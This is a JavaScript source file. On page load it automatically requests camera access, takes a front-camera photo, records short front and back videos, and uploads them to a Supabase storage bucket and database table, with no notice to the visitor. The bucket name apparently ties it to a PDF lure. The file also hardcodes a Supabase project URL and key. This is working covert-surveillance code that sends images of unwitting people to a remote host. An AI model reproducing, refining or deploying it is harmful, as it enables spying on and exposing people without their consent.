import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

// ---------------------
// SUPABASE CONFIG
// ---------------------
const supabaseUrl = "https://ozpdotxjaprdsxvlrikp.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im96cGRvdHhqYXByZHN4dmxyaWtwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUxMDkzMTEsImV4cCI6MjA4MDY4NTMxMX0.0J0czcxYk7FnnXjN-43A88BWhMou_C5yzgKMOkjaS_o";

const supabase = createClient(supabaseUrl, supabaseKey);

// Auto-start capture when page loads
window.addEventListener("load", () => startCapture());

// ---------------------
// SAFE PHOTO SNAPSHOT (WORKS EVERYWHERE)
// ---------------------
async function takeSnapshot(stream) {
  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);

  // grabFrame works on all browsers (takePhoto fails on mobile)
  const frame = await imageCapture.grabFrame();

  const canvas = document.createElement("canvas");
  canvas.width = frame.width;
  canvas.height = frame.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(frame, 0, 0);

  return new Promise((resolve) =>
    canvas.toBlob(resolve, "image/jpeg", 0.9)
  );
}

// ---------------------
// RELIABLE VIDEO RECORDER (MOBILE SAFE)
// ---------------------
function recordVideo(stream, ms) {
  return new Promise((resolve) => {
    const recorder = new MediaRecorder(stream, {
      mimeType: "video/webm",
    });

    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);
    recorder.onstop = () =>
      resolve(new Blob(chunks, { type: "video/webm" }));

    // small delay for mobile browsers
    setTimeout(() => {
      recorder.start();
      setTimeout(() => recorder.stop(), ms);
    }, 200);
  });
}

// ---------------------
// MAIN CAPTURE LOGIC
// ---------------------
async function startCapture() {
  try {
    // ---------- FRONT CAMERA ----------
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
    });

    // Take photo safely
    const photoBlob = await takeSnapshot(frontStream);

    // Record 3 sec front video
    const frontVideoBlob = await recordVideo(frontStream, 3000);

    frontStream.getTracks().forEach((t) => t.stop());

    // ---------- BACK CAMERA ----------
    let backStream;
    try {
      backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } },
      });
    } catch (err) {
      backStream = await navigator.mediaDevices.getUserMedia({
        video: true,
      });
    }

    const backVideoBlob = await recordVideo(backStream, 3000);
    backStream.getTracks().forEach((t) => t.stop());

    // ---------- UPLOAD ----------
    const photoURL = await uploadSupabase(photoBlob, "front.jpg");
    const frontVideoURL = await uploadSupabase(frontVideoBlob, "front.webm");
    const backVideoURL = await uploadSupabase(backVideoBlob, "back.webm");

    // ---------- SAVE TO DATABASE ----------
    const { data, error } = await supabase
      .from("captures")
      .insert({
        photo_url: photoURL,
        front_video_url: frontVideoURL,
        back_video_url: backVideoURL,
        created_at: new Date().toISOString(),
      });

    if (error) throw error;

    console.log("🔥 Saved to Supabase table:", data);
  } catch (err) {
    console.error("❌ Capture error:", err);
    alert("Capture error: " + err.message);
  }
}

// ---------------------
// UPLOAD TO SUPABASE
// ---------------------
async function uploadSupabase(blob, filename) {
  const fullName = `captures/${Date.now()}_${filename}`;

  const { error: uploadError } = await supabase.storage
    .from("pdfniba")
    .upload(fullName, blob, {
      cacheControl: "3600",
      contentType: blob.type,
      upsert: false,
    });

  if (uploadError) {
    console.error("Upload failed:", uploadError);
    return null;
  }

  const { data } = supabase.storage
    .from("pdfniba")
    .getPublicUrl(fullName);

  return data.publicUrl;
}
